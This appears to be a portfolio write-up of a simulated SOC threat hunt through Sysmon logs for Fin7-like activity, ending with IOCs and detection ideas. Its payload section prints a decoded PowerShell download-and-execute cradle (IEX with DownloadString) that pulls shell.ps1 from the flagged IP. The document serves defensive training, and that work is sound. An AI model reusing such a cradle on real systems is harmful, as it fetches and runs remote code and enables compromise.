🔍 Fin7 Threat Hunt – Sysmon Log Analysis



📌 Overview
This project simulates a real-world SOC investigation where a threat intelligence alert flagged communication with a known malicious IP (**192.168.10.45**) associated with Fin7 activity.

Despite the alert, no action was taken by the EDR, requiring manual log analysis to uncover the attack.

🎯 Objectives
- Identify the initial point of compromise  
- Detect persistence mechanisms  
- Analyze attacker payload and intent  

---
🛠️ Tools Used
- Visual Studio Code (JSON Viewer)
- CyberChef (Base64 Decoding)
- Sysmon Logs

---
🔬 Investigation Process

 🔹 Step 1: Log Preparation
The Sysmon JSON dataset was initially compressed.  
It was formatted using VS Code to improve readability and enable effective analysis.

---

🔹 Step 2: Identify Suspicious Network Activity
Using search functionality, the malicious IP was located:

- **IP Address:** 192.168.10.45  
- **Port:** 80 (HTTP)  
- **Event Type:** NetworkConnection (Event ID 3)  

This revealed an outbound connection from a system process to a known malicious endpoint.



---

 🔹 Step 3: Defense Evasion Technique
The attacker avoided detection by using **Living-off-the-Land (LotL) techniques**, leveraging legitimate system binaries.

- Use of trusted tools reduced antivirus detection
- Activity blended with normal system operations



---
 🔹 Step 4: Persistence Mechanism
Persistence was established using **Windows Scheduled Tasks** via `schtasks.exe`.

- The task was configured to run every **30 minutes**
- Ensures continued execution after reboot




 🔹 Step 5: PowerShell Payload (Obfuscated)
A suspicious PowerShell command was identified using Base64 encoding.





### 🔓 Decoded Payload

powershell
IEX (New-Object Net.WebClient).DownloadString ('h[t][t][p]192[.]168[.]10[.]45/shell.ps1')

---

🔍 Payload Analysis

The decoded command reveals:

Use of IEX (Invoke-Expression) to execute code in memory
Retrieval of a remote script from a malicious server
Likely execution of additional payloads


🔗 Attack Chain Summary
Suspicious process initiates outbound HTTP connection
Communication established with malicious IP (192.168.10.45)
Persistence created via scheduled task (schtasks.exe)
PowerShell executes encoded command
Remote payload is downloaded and executed

👉 This behavior strongly indicates Command-and-Control (C2) activity and persistent system compromise.


⚠️ Indicators of Compromise (IOCs)
IP Address: 192.168.10.45
Protocol: HTTP (Port 80)
Technique: Base64-encoded PowerShell execution
Persistence: Scheduled Task (schtasks.exe)
Payload: Remote script execution



🛡️ Detection & Mitigation Ideas
Monitor outbound traffic to suspicious IP addresses
Alert on PowerShell usage with -EncodedCommand
Detect abnormal usage of schtasks.exe
Implement application whitelisting
Strengthen logging for process creation events



